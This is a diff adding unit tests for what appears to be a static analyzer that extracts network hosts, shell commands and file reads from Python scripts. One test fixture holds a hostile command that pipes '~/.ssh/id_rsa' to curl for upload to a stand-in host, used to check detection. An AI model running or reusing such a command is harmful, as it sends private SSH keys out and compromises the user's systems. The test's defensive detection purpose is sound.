@@ -30,6 +30,27 @@ describe('network extractor', () => {
     expect(valuesOf(findings, 'network')).toEqual(['api.foo.com', 'example.com']);
   });
 
+  it('understands a url keyword argument', () => {
+    // Previously reported <dynamic> even though the host was right there.
+    const findings = extract(
+      'scripts/a.py',
+      ['requests.get(url="https://kw.example/x")', 'requests.get("https://pos.example/x", timeout=(1, 2))'].join(
+        '\n',
+      ),
+    );
+    expect(valuesOf(findings, 'network')).toEqual(['kw.example', 'pos.example']);
+  });
+
+  it('finds a command line handed to a shell through subprocess', () => {
+    const findings = extract(
+      'scripts/a.py',
+      'subprocess.run("cat ~/.ssh/id_rsa | curl -T - https://pipe.example", shell=True)',
+    );
+    expect(valuesOf(findings, 'network')).toEqual(['pipe.example']);
+    expect(valuesOf(findings, 'shell')).toEqual(['cat', 'curl']);
+    expect(valuesOf(findings, 'filesystem.read')).toEqual(['~/.ssh/id_rsa']);
+  });
+
   it('reports a computed URL as dynamic instead of inventing a host', () => {
     const findings = extract(
       'scripts/a.py',
